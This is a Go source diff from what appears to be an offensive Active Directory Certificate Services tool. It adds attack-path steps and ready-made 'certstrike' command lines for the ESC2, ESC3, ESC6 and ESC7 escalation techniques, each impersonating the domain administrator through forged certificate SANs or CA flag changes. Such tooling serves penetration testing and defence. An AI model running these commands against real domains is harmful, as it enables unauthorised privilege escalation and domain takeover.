@@ -105,12 +105,16 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			fmt.Sprintf("Identify template: %s (Any Purpose EKU + enrollee supplies subject)", tmpl.Name),
 			"Request certificate with Any Purpose EKU — can be used as client auth",
 			"Authenticate as any user specified in the SAN",
+			fmt.Sprintf("Command: certstrike pki --exploit esc2 --template %s --upn administrator@%s --target-dc %s --domain %s",
+				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC3":
 		return []string{
 			fmt.Sprintf("Identify template: %s (Certificate Request Agent EKU)", tmpl.Name),
-			"Enroll for enrollment agent certificate",
-			"Use agent certificate to enroll on behalf of other users in restricted templates",
+			"Stage 1: Enroll for enrollment agent certificate",
+			"Stage 2: Use agent certificate to enroll on behalf of target user",
+			fmt.Sprintf("Command: certstrike pki --exploit esc3 --template %s --upn administrator@%s --target-dc %s --domain %s",
+				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC13":
 		return []string{
@@ -138,6 +142,24 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Restore original template configuration",
 			fmt.Sprintf("Command: certstrike pki --exploit esc4 --template %s --upn administrator@%s --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
+		}
+	case "ESC6":
+		return []string{
+			fmt.Sprintf("Identify template: %s (CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled)", tmpl.Name),
+			"Request certificate from any template with arbitrary SAN in request attributes",
+			"CA processes the SAN attribute regardless of template configuration",
+			"Authenticate with forged certificate as target user",
+			fmt.Sprintf("Command: certstrike pki --exploit esc6 --template %s --upn administrator@%s --target-dc %s --domain %s",
+				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
+		}
+	case "ESC7":
+		return []string{
+			"Identify CA where attacker has ManageCA rights",
+			"Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA",
+			"Exploit as ESC6 — request cert with arbitrary SAN",
+			"Restore original CA configuration",
+			fmt.Sprintf("Command: certstrike pki --exploit esc7 --ca <CA_NAME> --upn administrator@%s --target-dc %s --domain %s",
+				cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC8":
 		return []string{
